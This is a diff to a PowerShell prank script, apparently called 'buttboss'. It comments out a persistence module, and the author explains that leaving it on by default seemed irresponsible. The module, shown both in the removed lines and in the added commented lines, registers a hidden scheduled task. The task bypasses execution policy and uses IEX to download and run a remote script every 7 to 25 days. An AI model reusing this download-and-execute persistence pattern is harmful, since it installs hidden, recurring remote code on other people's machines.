@@ -86,10 +86,13 @@ notepad "C:\Goofin\buttbossin.txt"
 
 # Persistence Module / Scheduled Task 
 # Could we trigger it off of a specific event number?
+#
+# Commented out because it seemed irresponsible to have it be the default. This way people can play with it and not get butt'ed back in a week or two
+#
 # Get a random number between 1 week and 25 days to re-butt the system 
-$reseed = 7..25 | Get-Random
-[int]$reseed
- $rebutt = New-ScheduledTaskAction -Execute "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://github.com/mellonaut/buttboss/buttboss.ps1'''))'"
- $schedulebutts = New-ScheduledTasktrigger -Daily -DaysInterval $reseed -At 10am 
- Register-ScheduledTask BringBackTheButts -Action $rebutt -Trigger $schedulebutts
-)
+# $reseed = 7..25 | Get-Random
+# [int]$reseed
+#  $rebutt = New-ScheduledTaskAction -Execute "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://github.com/mellonaut/buttboss/buttboss.ps1'''))'"
+#  $schedulebutts = New-ScheduledTasktrigger -Daily -DaysInterval $reseed -At 10am 
+#  Register-ScheduledTask BringBackTheButts -Action $rebutt -Trigger $schedulebutts
+# )
